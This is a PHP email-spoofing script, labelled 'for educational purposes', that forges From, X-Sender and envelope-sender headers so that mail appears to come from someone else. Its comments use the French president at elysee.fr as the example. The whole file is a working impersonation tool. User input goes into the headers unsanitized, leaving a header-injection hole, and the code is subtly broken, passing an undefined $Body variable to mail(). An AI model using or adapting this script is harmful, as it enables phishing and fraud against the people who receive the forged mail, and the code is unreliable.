<?
/*
Email Spoofing script (PHP). For Educational Purposes only.
To note that capabilities of the script have been intentionally limited.
This work is licensed under a MIT License. Copyright 2012 Florian Bersier
*/

// Get posted data into local variables
$EmailFrom = Trim(stripslashes($_POST['EmailFrom']));    // Your email, e.g. me@example.com
$EmailTo = Trim(stripslashes($_POST['EmailTo']));        // Recipient, e.g. email of your friend
$FakeEmail = Trim(stripslashes($_POST['FakeEmail']));    // Fake email, e.g. sarkozy@elysee.fr
$FakeDomain = Trim(stripslashes($_POST['domain']));      // Fake Domain, e.g. elysee.fr
$Name = Trim(stripslashes($_POST['Name']));              // Your name
$FakeName = Trim(stripslashes($_POST['FakeName']));      // Your fake name, e.g. Nicolas Sarkozy

$Subject = Trim(stripslashes($_POST['Subject']));        // Subject of the email
$Message = nl2br(Trim(stripslashes($_POST['Message']))); // Body of the email

// Modify headers of the Email
$FakeSender = "X-Sender: $FakeDomain";
$FakeReturn = "Return-Path: $EmailFrom";
$Fake = "From: $FakeName ";
$Reply = "Reply-To: $EmailFrom";
$BCC = "Bcc: $EmailFrom";
$additional = "-f $FakeEmail";                          // Hide the Mailed-by or Via
$headers = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= $FakeSender. "\r\n";
$headers .= "X-Priority: 3\r\n";                        // Normal priority (3), urgent is often categorized as Spam
$headers .= $Fake . "\r\n";
$headers .= $Reply . "\r\n";
$headers .= $BCC . "\r\n";
$headers .= $FakeReturn . "\r\n";

// Finally, Send Email
mail($EmailTo, $Subject, $Body, $headers, $additional);
?>